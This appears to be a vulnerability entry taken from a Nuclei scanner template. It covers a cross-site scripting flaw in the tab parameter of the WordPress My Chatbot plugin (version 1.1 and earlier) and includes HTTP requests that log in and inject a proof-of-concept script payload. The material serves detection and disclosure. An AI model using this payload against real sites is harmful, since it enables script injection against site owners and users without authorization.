# Nuclei Template: WordPress My Chatbot <= 1.1 - Cross-Site Scripting
**Template ID:** my-chatbot-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`my-chatbot-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress My Chatbot <= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/c0b6f63b-95d1-4782-9554-975d6d7bbd3d
